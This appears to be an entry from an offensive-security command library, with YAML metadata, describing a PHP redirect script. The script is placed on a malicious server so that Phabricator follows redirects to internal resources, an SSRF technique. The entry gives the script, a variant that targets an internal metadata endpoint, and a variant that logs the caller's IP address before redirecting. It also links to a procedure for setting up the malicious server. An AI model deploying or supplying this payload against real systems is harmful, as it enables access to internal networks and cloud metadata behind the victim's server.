---
data: |-
  <?php
  header("Location: http://anywhere.loc/bad_intentions");
  ?>
tags:
  - redirect
  - ssrf
type: command
output: null
executor: php
platforms:
  - PHP
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:46.183Z'
id: 78bfe305-2152-483d-9bd1-722f9effde2f
verified: false
validated: true
submitted: true
---
# php-redirect-script-for-ssrf

## Command

```php
<?php
header("Location: http://anywhere.loc/bad_intentions");
?>
```

## Description

This PHP script, placed at /status on a malicious server, redirects incoming requests from Phabricator to arbitrary URLs, exploiting SSRF to access internal or external resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | Redirect URL (e.g., http://anywhere.loc/bad_intentions for internal SSRF) | Yes |

## Examples

### Basic Usage

```php
<?php
header("Location: http://internal.service/metadata");
?>
```

### Advanced Usage

Add logging before redirect:

```php
<?php
file_put_contents('log.txt', $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
header("Location: http://target.internal");
?>
```

## Expected Output

HTTP 302 redirect response causing the client (Phabricator) to follow to the specified URL, potentially revealing internal data.

## Related

- [[procedures/Set-Up-Malicious-Server-for-SSRF-Redirect]]
